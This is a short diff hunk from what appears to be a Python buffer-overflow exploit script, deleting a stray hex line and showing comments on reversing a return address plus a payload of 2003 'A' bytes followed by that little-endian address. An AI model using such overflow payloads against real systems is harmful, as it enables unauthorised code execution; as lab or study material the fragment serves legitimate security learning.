@@ -816,8 +816,6 @@ from time import sleep
     # Reversed = `AF 11 50 62`
     # Final    = "\xAF\x11\x50\x62"
 
-625011AF
-
 shellcode = "A" * 2003 + "\xAF\x11\x50\x62"
 
 while True:
